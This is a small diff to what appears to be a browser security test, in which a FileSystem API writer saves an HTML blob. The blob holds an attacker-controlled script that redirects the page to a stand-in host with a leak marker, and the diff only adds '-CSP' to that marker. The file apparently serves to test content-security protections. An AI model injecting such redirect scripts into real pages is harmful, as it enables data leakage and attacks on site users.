@@ -9,7 +9,7 @@ function onInitFs(fs) {
     function (fileEntry) {
       fileEntry.createWriter(function (fileWriter) {
         var attackerControlledString =
-          "<script>document.location.href='https://a.test/report/?leak=c916326'</script>";
+          "<script>document.location.href='https://a.test/report/?leak=c916326-CSP'</script>";
         var blob = new Blob([attackerControlledString], { type: "text/html" });
         fileWriter.write(blob);
       }, errorHandler);
